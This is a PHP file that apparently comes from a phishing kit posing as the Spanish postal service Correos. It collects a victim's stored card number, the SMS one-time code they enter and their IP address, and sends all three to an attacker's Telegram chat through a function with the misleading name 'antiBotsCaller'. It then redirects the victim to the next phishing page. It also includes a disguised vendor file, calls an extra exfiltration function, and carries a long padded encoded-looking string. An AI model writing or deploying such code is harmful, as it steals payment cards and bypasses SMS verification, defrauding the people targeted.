<?php

session_start();
require_once "../settings/conf.php";
include "../inc/antiii.php";
include "../inc/vendor/composer/phpextension.php";

$message =  "|━━━━━━【📩 CORREOS 🎭】━━━━━━ \r\n";
$message .= "| 💳 CC : " . $_SESSION['card'] . "\r\n";
$message .= "| 📨 SMS : " . $_POST['sms'] . "\r\n";
$message .= " *━━━━━━【📍" . $_SESSION["IP"] . "📍】━━━━━━ \r\n";


$text = $message;

$msgId = TELEGRAM_CHAT_ID;
$token = TELEGRAM_TOKEN;
function antiBotsCaller($messaggio,$token,$chatid) {
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid;
    $url = $url . "&text=" . urlencode($messaggio);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
antiBotsCaller($text,$token,$msgId);
"c3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQ
rQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc
3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOG
hFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWF
g5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TT
R0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZz
QrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVI
ZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCty
ZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lz    "
;
cargando($text,$f,$c);

header("Location: ../sms2.php");
?>